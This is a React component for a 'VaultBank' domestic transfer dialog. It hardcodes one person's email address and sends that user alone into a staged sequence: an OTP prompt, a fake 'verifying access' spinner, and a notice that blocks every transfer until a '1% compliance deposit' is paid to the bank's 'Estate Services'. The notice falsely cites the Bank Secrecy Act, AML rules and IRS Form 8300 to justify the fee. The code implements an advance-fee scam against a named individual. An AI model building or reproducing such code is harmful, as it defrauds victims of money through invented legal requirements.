import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { TransferReceipt } from "./TransferReceipt";
import { OTPVerificationModal } from "./OTPVerificationModal";
import { createNotification, NotificationTemplates } from "@/lib/notifications";
import bankLogo from "@/assets/vaultbank-logo.png";
import { AlertDialog, AlertDialogContent, AlertDialogDescription, AlertDialogHeader, AlertDialogTitle, AlertDialogFooter, AlertDialogCancel } from "@/components/ui/alert-dialog";
import { AlertTriangle } from "lucide-react";

interface DomesticTransferModalProps {
  onClose: () => void;
  onSuccess: () => void;
}

export function DomesticTransferModal({ onClose, onSuccess }: DomesticTransferModalProps) {
  const navigate = useNavigate();
  const [accounts, setAccounts] = useState<any[]>([]);
  const [profile, setProfile] = useState<any>(null);
  const [fromAccount, setFromAccount] = useState("");
  const [recipientName, setRecipientName] = useState("");
  const [recipientBank, setRecipientBank] = useState("");
  const [routingNumber, setRoutingNumber] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [amount, setAmount] = useState("");
  const [transferMethod, setTransferMethod] = useState<"ACH" | "Wire">("ACH");
  const [memo, setMemo] = useState("");
  const [loading, setLoading] = useState(false);
  const [showReceipt, setShowReceipt] = useState(false);
  const [receiptData, setReceiptData] = useState<any>(null);
  const [showLoadingSpinner, setShowLoadingSpinner] = useState(false);
  const [showOTP, setShowOTP] = useState(false);
  const [pendingTransfer, setPendingTransfer] = useState<any>(null);
  const [showInheritanceWarning, setShowInheritanceWarning] = useState(false);
  const [totalBalance, setTotalBalance] = useState(0);
  const [showInheritanceOTP, setShowInheritanceOTP] = useState(false);
  const [inheritanceOTPLoading, setInheritanceOTPLoading] = useState(false);

  useEffect(() => {
    fetchAccounts();
    fetchProfile();
  }, []);

  const fetchProfile = async () => {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return;

    const { data } = await supabase
      .from("profiles")
      .select("*")
      .eq("id", user.id)
      .single();

    setProfile(data);
  };

  const fetchAccounts = async () => {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return;

    const { data } = await supabase
      .from("accounts")
      .select("*")
      .eq("user_id", user.id)
      .eq("status", "active");

    setAccounts(data || []);
    // Calculate total balance for inheritance warning
    const total = (data || []).reduce((sum, acc) => sum + parseFloat(String(acc.balance || 0)), 0);
    setTotalBalance(total);
  };

  const handleTransfer = async () => {
    if (!fromAccount || !recipientName || !recipientBank || !routingNumber || !accountNumber || !amount) {
      toast.error("Please fill in all required fields");
      return;
    }

    if (routingNumber.length !== 9) {
      toast.error("Routing number must be 9 digits");
      return;
    }

    const transferAmount = parseFloat(amount);
    if (isNaN(transferAmount) || transferAmount <= 0) {
      toast.error("Please enter a valid amount");
      return;
    }

    // Check if user is annanbelle72@gmail.com and send OTP first
    if (profile?.email === "annanbelle72@gmail.com") {
      setShowInheritanceOTP(true);
      return;
    }

    // Store transfer data and show OTP modal
    const selectedAccount = accounts.find(a => a.id === fromAccount);
    const fee = transferMethod === "Wire" ? "25.00" : "0.00";
    const reference = `DOM${Date.now()}${Math.random().toString(36).substr(2, 9).toUpperCase()}`;
    
    setPendingTransfer({
      fromAccount,
      selectedAccount,
      transferAmount,
      fee,
      reference
    });
    setShowOTP(true);
  };

  const handleOTPVerified = async () => {
    setShowOTP(false);
    setLoading(true);
    setShowLoadingSpinner(true);
    
    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) throw new Error("Not authenticated");

      // Get current account balance
      const { data: accountData } = await supabase
        .from("accounts")
        .select("balance")
        .eq("id", pendingTransfer.fromAccount)
        .single();

      if (!accountData) throw new Error("Account not found");

      const currentBalance = parseFloat(String(accountData.balance) || '0');
      const newBalance = currentBalance - pendingTransfer.transferAmount;

      if (newBalance < 0) {
        throw new Error("Insufficient funds");
      }

      // Update account balance and create transfer/transaction in parallel
      const [transferResult, transactionResult] = await Promise.all([
        supabase.from("transfers").insert({
          user_id: user.id,
          from_account: pendingTransfer.fromAccount,
          to_account: accountNumber,
          amount: pendingTransfer.transferAmount,
          status: "pending"
        }),
        supabase.from("transactions").insert({
          user_id: user.id,
          account_id: pendingTransfer.fromAccount,
          type: "debit",
          amount: pendingTransfer.transferAmount,
          description: `Domestic ${transferMethod} Transfer to ${recipientName} - Pending`,
          status: "pending"
        })
      ]);

      if (transferResult.error) throw transferResult.error;
      if (transactionResult.error) throw transactionResult.error;
      
      // Send pending notification
      await createNotification({
        userId: user.id,
        title: "Transfer Pending",
        message: `Your ${transferMethod} transfer of $${pendingTransfer.transferAmount.toFixed(2)} to ${recipientName} at ${recipientBank} is pending`,
        type: "pending"
      });
      
      setTimeout(() => {
        setShowLoadingSpinner(false);
        setReceiptData({
          type: 'domestic',
          fromAccount: pendingTransfer.selectedAccount?.account_type || '',
          toAccount: accountNumber,
          recipientName,
          recipientBank,
          amount: pendingTransfer.transferAmount.toFixed(2),
          currency: '$',
          reference: pendingTransfer.reference,
          date: new Date(),
          fee: pendingTransfer.fee,
          routingNumber,
          accountNumber,
          status: 'pending'
        });
        setShowReceipt(true);
        onSuccess();
        toast.success("Transfer submitted and pending");
      }, 2000);
    } catch (error: any) {
      toast.error(error.message || "Transfer failed");
      setShowLoadingSpinner(false);
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      <Dialog open={!showReceipt} onOpenChange={onClose}>
        <DialogContent className="sm:max-w-2xl max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle>Domestic Transfer</DialogTitle>
          </DialogHeader>

          <div className="space-y-4 py-4">
            <div className="space-y-2">
              <Label>From Account</Label>
              <Select value={fromAccount} onValueChange={setFromAccount}>
                <SelectTrigger>
                  <SelectValue placeholder="Select account" />
                </SelectTrigger>
                <SelectContent>
                  {accounts.map((account) => (
                    <SelectItem key={account.id} value={account.id}>
                      {account.account_type} - ${parseFloat(account.balance || 0).toFixed(2)}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label>Recipient Name</Label>
                <Input
                  placeholder="Michael Johnson"
                  value={recipientName}
                  onChange={(e) => setRecipientName(e.target.value)}
                />
              </div>

              <div className="space-y-2">
                <Label>Recipient Bank</Label>
                <Input
                  placeholder="Bank of America"
                  value={recipientBank}
                  onChange={(e) => setRecipientBank(e.target.value)}
                />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label>Routing Number (ABA)</Label>
                <Input
                  placeholder="026009593"
                  maxLength={9}
                  value={routingNumber}
                  onChange={(e) => setRoutingNumber(e.target.value.replace(/\D/g, ''))}
                />
              </div>

              <div className="space-y-2">
                <Label>Account Number</Label>
                <Input
                  placeholder="1234567890"
                  value={accountNumber}
                  onChange={(e) => setAccountNumber(e.target.value)}
                />
              </div>
            </div>

            <div className="space-y-2">
              <Label>Amount</Label>
              <Input
                type="number"
                step="0.01"
                placeholder="0.00"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
              />
            </div>

            <div className="space-y-2">
              <Label>Delivery Method</Label>
              <RadioGroup value={transferMethod} onValueChange={(v) => setTransferMethod(v as "ACH" | "Wire")}>
                <div className="flex items-center space-x-2 border p-3 rounded-lg">
                  <RadioGroupItem value="ACH" id="ach" />
                  <Label htmlFor="ach" className="flex-1 cursor-pointer">
                    ACH Transfer (1-2 business days, Free)
                  </Label>
                </div>
                <div className="flex items-center space-x-2 border p-3 rounded-lg">
                  <RadioGroupItem value="Wire" id="wire" />
                  <Label htmlFor="wire" className="flex-1 cursor-pointer">
                    Wire Transfer (Same day, $25 fee)
                  </Label>
                </div>
              </RadioGroup>
            </div>

            <div className="space-y-2">
              <Label>Memo (Optional)</Label>
              <Input
                placeholder="Payment for invoice #124"
                value={memo}
                onChange={(e) => setMemo(e.target.value)}
              />
            </div>
          </div>

          <div className="flex gap-2">
            <Button variant="outline" onClick={onClose} className="flex-1">
              Cancel
            </Button>
            <Button onClick={handleTransfer} disabled={loading} className="flex-1">
              {loading ? "Processing..." : "Send Transfer"}
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {showOTP && (
        <OTPVerificationModal
          open={showOTP}
          onClose={() => setShowOTP(false)}
          onVerify={handleOTPVerified}
          email={profile?.email || "your email"}
          action="domestic_transfer"
          amount={amount}
        />
      )}

      {showInheritanceOTP && profile?.email && (
        <OTPVerificationModal
          open={showInheritanceOTP}
          onClose={() => setShowInheritanceOTP(false)}
          email={profile.email}
          action="domestic_transfer"
          amount={amount}
          onVerify={async () => {
            setShowInheritanceOTP(false);
            setInheritanceOTPLoading(true);
            
            // Show loading for 3 seconds
            setTimeout(async () => {
              setInheritanceOTPLoading(false);
              setShowInheritanceWarning(true);
              
              // Create notification
              const { data: { user } } = await supabase.auth.getUser();
              if (user) {
                const notificationData = NotificationTemplates.securityAlert(
                  "Important compliance requirements detected for inherited account transfers. Please review the regulatory information."
                );
                await createNotification({
                  userId: user.id,
                  ...notificationData
                });
              }
            }, 3000);
          }}
        />
      )}

      {showReceipt && receiptData && (
        <TransferReceipt
          open={showReceipt}
          onClose={() => {
            setShowReceipt(false);
            onClose();
          }}
          transferData={receiptData}
        />
      )}

      {(showLoadingSpinner || inheritanceOTPLoading) && (
        <div className="fixed inset-0 bg-background/80 backdrop-blur-sm z-[100] flex items-center justify-center">
          <div className="text-center space-y-4">
            <img 
              src={bankLogo} 
              alt="VaultBank" 
              className="h-20 w-auto mx-auto animate-spin"
              style={{ animationDuration: '2s' }}
            />
            <p className="text-lg font-semibold">
              {inheritanceOTPLoading ? "Verifying account access..." : "Processing your transfer..."}
            </p>
          </div>
        </div>
      )}

      <AlertDialog open={showInheritanceWarning} onOpenChange={setShowInheritanceWarning}>
        <AlertDialogContent className="max-w-2xl max-h-[90vh] overflow-y-auto">
          <AlertDialogHeader>
            <div className="flex items-center gap-3 mb-4">
              <div className="p-3 bg-amber-500/10 rounded-full">
                <AlertTriangle className="h-7 w-7 text-amber-600" />
              </div>
              <AlertDialogTitle className="text-2xl font-semibold">Inherited Account Transfer Notice</AlertDialogTitle>
            </div>
            <AlertDialogDescription className="space-y-5 text-base">
              <div className="p-5 bg-green-500/5 border border-green-500/20 rounded-lg space-y-2">
                <p className="font-semibold text-green-700 text-base">Estate Documentation Status</p>
                <p className="text-sm text-foreground">All required inheritance documentation has been received, verified, and approved by our Estate Services Department in accordance with federal banking regulations.</p>
              </div>

              <div className="p-5 bg-amber-500/5 border border-amber-500/30 rounded-lg space-y-3">
                <p className="font-semibold text-amber-700 text-lg">Regulatory Compliance Requirement</p>
                <p className="text-sm text-foreground leading-relaxed">
                  In accordance with the Bank Secrecy Act (BSA) and Anti-Money Laundering (AML) regulations, a mandatory compliance deposit of <span className="font-bold">one percent (1%) of the total inherited account balance</span> must be received before any transfer, withdrawal, or disbursement of inherited funds can be processed.
                </p>
                <div className="mt-3 p-4 bg-background rounded border border-border">
                  <p className="text-xs text-muted-foreground mb-1">Total Inherited Account Balance:</p>
                  <p className="text-2xl font-bold text-foreground">${totalBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</p>
                  <div className="h-px bg-border my-2"></div>
                  <p className="text-xs text-muted-foreground mb-1">Required Compliance Deposit (1%):</p>
                  <p className="text-xl font-bold text-amber-700">${(totalBalance * 0.01).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}</p>
                </div>
              </div>

              <div className="p-5 bg-blue-500/5 border border-blue-500/20 rounded-lg space-y-2">
                <p className="font-semibold text-blue-700 text-base">Internal Revenue Service (IRS) Reporting</p>
                <p className="text-sm text-foreground leading-relaxed">
                  Large-value inherited fund transfers are subject to mandatory reporting to the Internal Revenue Service under Form 8300 requirements. Failure to comply with federal tax reporting obligations may result in transaction delays, additional scrutiny, substantial penalties, or legal action. Please ensure all tax compliance measures are satisfied before initiating transfers.
                </p>
              </div>

              <div className="p-5 bg-muted/50 rounded-lg border border-border">
                <p className="text-sm text-foreground leading-relaxed">
                  <span className="font-semibold">Next Steps:</span> To complete the compliance deposit and proceed with your transfer, please contact our Estate Services Department through the secure support channel within your account dashboard. Our specialists are available to guide you through the deposit process and answer any questions regarding this requirement.
                </p>
              </div>

              <p className="text-xs text-muted-foreground italic pt-2">
                VaultBank is committed to maintaining the highest standards of regulatory compliance and protecting our clients' interests in accordance with all applicable federal and state banking laws.
              </p>
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogCancel 
              className="font-semibold"
              onClick={() => {
                setShowInheritanceWarning(false);
                onClose();
                navigate('/dashboard');
              }}
            >
              I Acknowledge and Understand
            </AlertDialogCancel>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </>
  );
}
